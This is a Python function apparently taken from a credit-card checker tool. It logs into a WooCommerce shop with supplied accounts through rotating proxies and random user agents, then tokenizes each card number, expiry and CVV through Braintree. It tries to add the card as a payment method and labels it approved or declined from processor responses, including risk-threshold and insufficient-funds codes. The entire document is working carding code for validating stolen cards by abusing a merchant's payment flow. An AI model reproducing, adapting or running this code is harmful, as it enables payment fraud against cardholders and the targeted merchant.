async def process_card(self, cc, mm, yy, cvc, account, proxies=None):
    """Process a single card with given account and proxy"""
    try:
        user = generate_user_agent()
        
        # Configure proxy if available
        transport = None
        if proxies:
            transport = httpx.AsyncHTTPTransport(proxy=proxies, retries=3)
        
        async with httpx.AsyncClient(
            follow_redirects=True,
            timeout=30,
            transport=transport
        ) as client:
            headers = {
                'authority': 'www.tea-and-coffee.com',
                'user-agent': user,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
            }
            
            # Step 1: Get login page
            response = await client.get('https://www.tea-and-coffee.com/account/', headers=headers)
            
            # Find login nonce
            login_nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
            if not login_nonce_match:
                return 'DECLINED', 'Could not find login nonce'
            
            nonce = login_nonce_match.group(1)

            # Step 2: Login with account credentials
            data = {
                'username': account['email'],
                'password': account['password'],
                'woocommerce-login-nonce': nonce,
                '_wp_http_referer': '/account/',
                'login': 'Log in',
            }
            
            response = await client.post(
                'https://www.tea-and-coffee.com/account/',
                headers=headers,
                data=data
            )
            
            # Check if login was successful
            if not ('Log out' in response.text or 'My Account' in response.text or 'account' in str(response.url)):
                return 'DECLINED', 'Login failed'
            
            # Step 3: Navigate to add payment method
            headers.update({
                'referer': 'https://www.tea-and-coffee.com/account/',
            })
            
            # Try custom payment method page first
            response = await client.get(
                'https://www.tea-and-coffee.com/account/add-payment-method-custom/',
                headers=headers
            )

            if response.status_code != 200:
                response = await client.get(
                    'https://www.tea-and-coffee.com/account/add-payment-method/',
                    headers=headers
                )

            # Find payment nonce
            payment_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
            if not payment_nonce_match:
                return 'DECLINED', 'Could not find payment nonce'
            
            nonce = payment_nonce_match.group(1)

            # Find client nonce for Braintree
            client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
            if not client_nonce_match:
                return 'DECLINED', 'Could not find client token nonce'
            
            client_nonce = client_nonce_match.group(1)
            
            headers.update({
                'x-requested-with': 'XMLHttpRequest',
                'referer': str(response.url),
            })

            # Step 4: Get client token
            data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': client_nonce,
            }

            response = await client.post(
                'https://www.tea-and-coffee.com/wp-admin/admin-ajax.php',
                headers=headers,
                data=data
            )
            
            if 'data' not in response.json():
                return 'DECLINED', 'No data in client token response'
                
            enc = response.json()['data']
            dec = base64.b64decode(enc).decode('utf-8')
            
            # Find authorization
            authorization_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
            if not authorization_match:
                return 'DECLINED', 'Could not find authorization fingerprint'
            authorization = authorization_match[0]

            # Step 5: Tokenize card
            headersn = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': f'Bearer {authorization}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': user,
            }

            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': str(random.randint(1000000000, 9999999999)),
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
            }
            
            response = await client.post(
                'https://payments.braintree-api.com/graphql',
                headers=headersn,
                json=json_data
            )

            # Check tokenization response
            if 'data' not in response.json() or 'tokenizeCreditCard' not in response.json()['data']:
                error_text = response.text
                
                # Extract Braintree processor response codes
                processor_response = self.extract_processor_response(error_text)
                if processor_response:
                    code = processor_response['code']
                    message = processor_response['message']
                    
                    # Determine result based on response content
                    result = self.determine_result_from_response(f"{code}: {message}")
                    return result, f'{code}: {message}'
                
                # Fallback to manual code extraction
                braintree_code = self.extract_braintree_code(error_text)
                if braintree_code:
                    code, message = braintree_code
                    result = self.determine_result_from_response(f"{code}: {message}")
                    return result, f'{code}: {message}'
                
                # If no specific code found, use generic extraction
                generic_response = self.extract_generic_response(error_text)
                result = self.determine_result_from_response(generic_response)
                return result, generic_response
                    
            tok = response.json()['data']['tokenizeCreditCard']['token']

            # Step 6: Process payment - FOLLOW REDIRECTS PROPERLY
            current_url_str = str(response.url)
            if 'add-payment-method-custom' in current_url_str:
                endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
                referer = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
                wp_referer = '/account/add-payment-method-custom/'
            else:
                endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method/'
                referer = 'https://www.tea-and-coffee.com/account/add-payment-method/'
                wp_referer = '/account/add-payment-method/'

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.tea-and-coffee.com',
                'referer': referer,
                'user-agent': user,
            }

            data = {
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': 'visa',
                'wc-braintree-credit-card-3d-secure-enabled': '',
                'wc-braintree-credit-card-3d-secure-verified': '',
                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                'wc_braintree_credit_card_payment_nonce': tok,
                'wc_braintree_device_data': '',
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': nonce,
                '_wp_http_referer': wp_referer,
                'woocommerce_add_payment_method': '1',
            }
            
            # Process payment with redirect following
            response = await client.post(
                endpoint,
                headers=headers,
                data=data,
                follow_redirects=True  # Important for 302 handling
            )
            
            # Parse response like in finalb3mass11.py
            response_text = response.text
            final_url = str(response.url)

            # Check for success - EXACTLY like in original file
            if any(success_msg in response_text for success_msg in [
                'Nice! New payment method added', 
                'Payment method successfully added',
                'Payment method added',
                'successfully added'
            ]):
                return 'APPROVED', 'Payment method added successfully'
            
            # Check for specific error patterns - EXACTLY like in original file
            error_pattern = r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>'
            error_match = re.search(error_pattern, response_text, re.DOTALL)
            
            if error_match:
                error_msg = error_match.group(1).strip()
                if 'risk_threshold' in error_msg.lower():
                    return "DECLINED", "RISK_BIN: Retry Later"
                elif 'do not honor' in error_msg.lower():
                    result = self.determine_result_from_response(error_msg)
                    return result, f"DECLINED - Do Not Honor"
                elif 'insufficient funds' in error_msg.lower():
                    result = self.determine_result_from_response(error_msg)
                    return result, f"DECLINED - Insufficient Funds"
                elif 'invalid' in error_msg.lower():
                    return "DECLINED", f"DECLINED - Invalid Card"
                else:
                    result = self.determine_result_from_response(error_msg)
                    return result, f"DECLINED - {error_msg}"
            
            # Check for generic WooCommerce errors
            if 'woocommerce-error' in response_text:
                return "DECLINED", "DECLINED - Payment Failed"
            
            # If we got a redirect but ended up here, check final URL
            if 'account' in final_url and 'payment' not in final_url:
                # We were redirected to account page, check if payment was actually added
                payment_methods_response = await client.get(
                    'https://www.tea-and-coffee.com/account/payment-methods/',
                    headers=headers
                )
                
                # Check if our card appears in payment methods
                if cc[-4:] in payment_methods_response.text:
                    return 'APPROVED', 'Payment method added (verified in payment methods)'
                else:
                    return "DECLINED", 'Redirected to account page (payment likely failed)'
                    
            # If we reached here and have no clear response, check payment methods page directly
            payment_methods_response = await client.get(
                'https://www.tea-and-coffee.com/account/payment-methods/',
                headers=headers
            )
            
            if cc[-4:] in payment_methods_response.text:
                return 'APPROVED', 'Payment method verified in payment methods'
            else:
                return "DECLINED", 'Unknown response - no payment method found'

    except Exception as e:
        return 'DECLINED', f'Error: {str(e)}'
